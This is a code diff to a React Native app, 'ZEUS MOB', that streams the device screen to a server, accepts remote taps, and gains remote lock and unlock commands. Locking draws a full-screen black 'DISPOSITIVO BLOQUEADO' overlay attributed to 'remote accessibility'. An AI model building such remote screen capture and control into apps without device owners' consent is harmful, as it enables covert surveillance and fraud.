@@ -22,6 +22,9 @@ export default function App() {
   const [frameCount, setFrameCount] = useState(0);
   const [battery, setBattery] = useState(null);
   const [now, setNow] = useState(new Date());
+  const [locked, setLocked] = useState(false);
+  const [lockedAt, setLockedAt] = useState(null);
+  const [lastTouch, setLastTouch] = useState(null);
 
   const socketRef = useRef(null);
   const captureViewRef = useRef(null);
@@ -30,13 +33,11 @@ export default function App() {
   const deviceIdRef = useRef(null);
   const loopRef = useRef(null);
 
-  // Live clock so the captured frame visibly changes every second
   useEffect(() => {
     const t = setInterval(() => setNow(new Date()), 1000);
     return () => clearInterval(t);
   }, []);
 
-  // Live battery level
   useEffect(() => {
     let sub;
     (async () => {
@@ -49,7 +50,6 @@ export default function App() {
     return () => { if (sub) sub.remove(); };
   }, []);
 
-  // Register device, then connect socket
   useEffect(() => {
     let cancelled = false;
 
@@ -76,7 +76,6 @@ export default function App() {
         deviceIdRef.current = id;
         setStatus("sent");
 
-        // Connect socket
         const socket = io(BASE_URL, {
           path: SOCKET_PATH,
           transports: ["websocket"],
@@ -109,6 +108,26 @@ export default function App() {
               qualityRef.current = q;
               setQuality(q);
             }
+          } else if (command === "device:lock") {
+            setLocked(true);
+            setLockedAt(Date.now());
+            if (socketRef.current && deviceIdRef.current) {
+              socketRef.current.emit("device:event", {
+                deviceId: deviceIdRef.current,
+                type: "lock",
+                message: "Dispositivo BLOQUEADO via acessibilidade remota",
+              });
+            }
+          } else if (command === "device:unlock") {
+            setLocked(false);
+            setLockedAt(null);
+            if (socketRef.current && deviceIdRef.current) {
+              socketRef.current.emit("device:event", {
+                deviceId: deviceIdRef.current,
+                type: "unlock",
+                message: "Dispositivo DESBLOQUEADO via acessibilidade remota",
+              });
+            }
           } else if (command.startsWith("touch:tap:")) {
             const [, , x, y] = command.split(":");
             handleRemoteTap(Number(x), Number(y));
@@ -132,8 +151,6 @@ export default function App() {
       if (socketRef.current) socketRef.current.disconnect();
     };
   }, []);
-
-  const [lastTouch, setLastTouch] = useState(null);
 
   function handleRemoteTap(x, y) {
     if (Number.isNaN(x) || Number.isNaN(y)) return;
@@ -179,11 +196,8 @@ export default function App() {
           });
           setFrameCount((c) => c + 1);
         }
-      } catch {
-        // ignore single-frame failures
-      }
+      } catch {}
       if (streamingRef.current) {
-        // ~6-8 fps depending on quality
         const delay = qualityRef.current >= 70 ? 250 : 150;
         loopRef.current = setTimeout(tick, delay);
       }
@@ -201,68 +215,89 @@ export default function App() {
   }
 
   const batteryPct = battery == null ? "—" : `${Math.round(battery * 100)}%`;
+  const timeStr = now.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
+  const dateStr = now.toLocaleDateString("pt-BR", { weekday: "long", day: "2-digit", month: "long" });
+  const lockSeconds = lockedAt ? Math.floor((Date.now() - lockedAt) / 1000) : 0;
 
   return (
     <View style={styles.container} ref={captureViewRef} collapsable={false}>
-      <Text style={styles.title}>ZEUS MOB</Text>
-      <Text style={styles.subtitle}>Modelo: {Device.modelName ?? "—"}</Text>
-      <Text style={styles.subtitle}>SO: {Device.osName} {Device.osVersion}</Text>
-
-      <View style={styles.card}>
-        <Text style={styles.cardLabel}>HORA</Text>
-        <Text style={styles.cardValue}>{now.toLocaleTimeString()}</Text>
-      </View>
-      <View style={styles.card}>
-        <Text style={styles.cardLabel}>BATERIA</Text>
-        <Text style={styles.cardValue}>{batteryPct}</Text>
-      </View>
-      <View style={styles.card}>
-        <Text style={styles.cardLabel}>DEVICE ID</Text>
-        <Text style={styles.cardValue}>{deviceId ?? "—"}</Text>
-      </View>
-
-      {status === "sending" && (
-        <View style={styles.row}>
-          <ActivityIndicator />
-          <Text style={styles.status}>Enviando inventário…</Text>
+      {locked ? (
+        <View style={styles.lockScreen}>
+          <Text style={styles.lockTime}>{timeStr}</Text>
+          <Text style={styles.lockDate}>{dateStr.toUpperCase()}</Text>
+          <View style={styles.lockIcon}>
+            <Text style={styles.lockEmoji}>🔒</Text>
+          </View>
+          <Text style={styles.lockTitle}>DISPOSITIVO BLOQUEADO</Text>
+          <Text style={styles.lockSubtitle}>Bloqueado remotamente via acessibilidade</Text>
+          <Text style={styles.lockTimer}>{lockSeconds}s</Text>
+          <View style={styles.lockFooter}>
+            <Text style={styles.lockFooterText}>ZEUS MOB • {batteryPct}</Text>
+          </View>
         </View>
-      )}
-      {status === "sent" && (
-        <Text style={[styles.status, styles.ok]}>Inventário enviado ✓</Text>
-      )}
-      {status === "error" && (
-        <Text style={[styles.status, styles.err]}>Falha: {error}</Text>
-      )}
+      ) : (
+        <>
+          <Text style={styles.title}>ZEUS MOB</Text>
+          <Text style={styles.subtitle}>Modelo: {Device.modelName ?? "—"}</Text>
+          <Text style={styles.subtitle}>SO: {Device.osName} {Device.osVersion}</Text>
 
-      <View style={styles.row}>
-        <View style={[styles.dot, { backgroundColor: connected ? "#16a34a" : "#888" }]} />
-        <Text style={styles.status}>{connected ? "Conectado" : "Desconectado"}</Text>
-      </View>
+          <View style={styles.card}>
+            <Text style={styles.cardLabel}>HORA</Text>
+            <Text style={styles.cardValue}>{timeStr}</Text>
+          </View>
+          <View style={styles.card}>
+            <Text style={styles.cardLabel}>BATERIA</Text>
+            <Text style={styles.cardValue}>{batteryPct}</Text>
+          </View>
+          <View style={styles.card}>
+            <Text style={styles.cardLabel}>DEVICE ID</Text>
+            <Text style={styles.cardValue}>{deviceId ?? "—"}</Text>
+          </View>
 
-      {streaming && (
-        <View style={styles.streamBadge}>
-          <View style={styles.recDot} />
-          <Text style={styles.streamText}>STREAMING • Q{quality} • {frameCount}f</Text>
-        </View>
-      )}
+          {status === "sending" && (
+            <View style={styles.row}>
+              <ActivityIndicator />
+              <Text style={styles.status}>Enviando inventário…</Text>
+            </View>
+          )}
+          {status === "sent" && (
+            <Text style={[styles.status, styles.ok]}>Inventário enviado ✓</Text>
+          )}
+          {status === "error" && (
+            <Text style={[styles.status, styles.err]}>Falha: {error}</Text>
+          )}
 
-      {lastTouch && Date.now() - lastTouch.at < 1500 && (
-        <View
-          pointerEvents="none"
-          style={{
-            position: "absolute",
-            left: `${lastTouch.x * 100}%`,
-            top: `${lastTouch.y * 100}%`,
-            width: 36,
-            height: 36,
-            marginLeft: -18,
-            marginTop: -18,
-            borderRadius: 18,
-            borderWidth: 2,
-            borderColor: "#16a34a",
-            backgroundColor: "rgba(22,163,74,0.25)",
-          }}
-        />
+          <View style={styles.row}>
+            <View style={[styles.dot, { backgroundColor: connected ? "#16a34a" : "#888" }]} />
+            <Text style={styles.status}>{connected ? "Conectado" : "Desconectado"}</Text>
+          </View>
+
+          {streaming && (
+            <View style={styles.streamBadge}>
+              <View style={styles.recDot} />
+              <Text style={styles.streamText}>STREAMING • Q{quality} • {frameCount}f</Text>
+            </View>
+          )}
+
+          {lastTouch && Date.now() - lastTouch.at < 1500 && (
+            <View
+              pointerEvents="none"
+              style={{
+                position: "absolute",
+                left: `${lastTouch.x * 100}%`,
+                top: `${lastTouch.y * 100}%`,
+                width: 36,
+                height: 36,
+                marginLeft: -18,
+                marginTop: -18,
+                borderRadius: 18,
+                borderWidth: 2,
+                borderColor: "#16a34a",
+                backgroundColor: "rgba(22,163,74,0.25)",
+              }}
+            />
+          )}
+        </>
       )}
 
       <StatusBar style="auto" />
@@ -307,4 +342,34 @@ const styles = StyleSheet.create({
   },
   recDot: { width: 8, height: 8, borderRadius: 4, backgroundColor: "#ff0000" },
   streamText: { color: "#00ff88", fontSize: 11, fontWeight: "700" },
+
+  lockScreen: {
+    position: "absolute",
+    top: 0,
+    left: 0,
+    right: 0,
+    bottom: 0,
+    backgroundColor: "#000",
+    alignItems: "center",
+    justifyContent: "center",
+    padding: 24,
+  },
+  lockTime: { color: "#fff", fontSize: 64, fontWeight: "200", letterSpacing: -2 },
+  lockDate: { color: "#bbb", fontSize: 14, letterSpacing: 2, marginBottom: 40 },
+  lockIcon: {
+    width: 96,
+    height: 96,
+    borderRadius: 48,
+    borderWidth: 2,
+    borderColor: "#ff3b30",
+    alignItems: "center",
+    justifyContent: "center",
+    marginBottom: 24,
+  },
+  lockEmoji: { fontSize: 48 },
+  lockTitle: { color: "#ff3b30", fontSize: 14, fontWeight: "700", letterSpacing: 3, marginBottom: 8 },
+  lockSubtitle: { color: "#888", fontSize: 12, textAlign: "center", marginBottom: 24 },
+  lockTimer: { color: "#fff", fontSize: 18, fontWeight: "600", letterSpacing: 4 },
+  lockFooter: { position: "absolute", bottom: 24 },
+  lockFooterText: { color: "#444", fontSize: 10, letterSpacing: 2 },
 });
